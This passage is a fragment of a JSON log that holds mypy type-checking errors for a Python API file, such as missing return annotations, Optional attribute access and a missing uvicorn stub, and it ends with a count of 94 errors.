expected \"Optional[Union[Headers, Mapping[str, str], Mapping[bytes, bytes], Sequence[Tuple[str, str]], Sequence[Tuple[bytes, bytes]]]]\"  [arg-type]\napi/main.py:179: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:182: error: Item \"None\" of \"Optional[Any]\" has no attribute \"get_user_history\"  [union-attr]\napi/main.py:192: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:195: error: Item \"None\" of \"Optional[Any]\" has no attribute \"search_similar\"  [union-attr]\napi/main.py:214: error: Returning Any from function declared to return \"Dict[str, Any]\"  [no-any-return]\napi/main.py:228: error: Returning Any from function declared to return \"str\"  [no-any-return]\napi/main.py:232: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:244: error: Cannot find implementation or library stub for module named \"uvicorn\"  [import-not-found]\nFound 94 errors in 5 files (checked 10 source files)\n"
        }
      },
      "duration": 0
    }
  }
}